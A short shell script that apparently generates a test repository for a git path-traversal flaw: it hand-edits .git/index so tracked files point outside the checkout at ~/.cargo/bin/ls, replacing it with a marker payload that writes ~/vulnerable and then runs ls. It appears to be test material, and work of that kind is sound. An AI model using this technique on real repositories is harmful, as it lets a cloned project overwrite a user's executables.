#!/bin/sh
# TODO: Before using in tests, limit this to never target real bin dirs!
set -eu

repo="$1"
target_bin='.cargo/bin'

git init -- "$repo"
cd -- "$repo"

cat >payload <<'EOF'
#!/bin/sh
printf 'Vulnerable!\n'
date >~/vulnerable
exec /bin/ls "$@"
EOF

upward='..'
for subdir in .a .b .c .d .e .f .g .h .i .j; do
    upward="../$upward"
    target="$subdir/$upward/$target_bin/ls"
    standin="$(printf '%s' "$target" | tr / @)"

    cp -- payload "$standin"
    git add --chmod=+x -- "$standin"

    standin_pattern="$(printf '%s' "$standin" | sed 's|\.|\\\.|g')"
    cp .git/index old_index
    LC_ALL=C sed "s|$standin_pattern|$target|g" old_index >.git/index
done

git commit -m 'Initial commit'
rm payload old_index
